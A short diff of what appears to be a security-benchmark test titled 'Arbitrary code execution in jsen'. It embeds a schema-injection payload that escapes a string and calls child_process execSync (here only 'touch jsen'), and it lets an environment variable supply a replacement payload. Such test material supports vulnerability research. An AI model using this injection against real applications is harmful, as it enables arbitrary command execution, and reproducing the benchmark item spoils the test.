@@ -12,7 +12,7 @@ test("Arbitrary code execution in jsen", () => {
       type: "object",
       properties: { username: { type: "string" } },
       required: [
-        "\"+clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync('touch jsen')+\""
+        process.env.SECBENCH_PAYLOAD || ("\"+clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync('touch jsen')+\"")
       ],
     })
   );
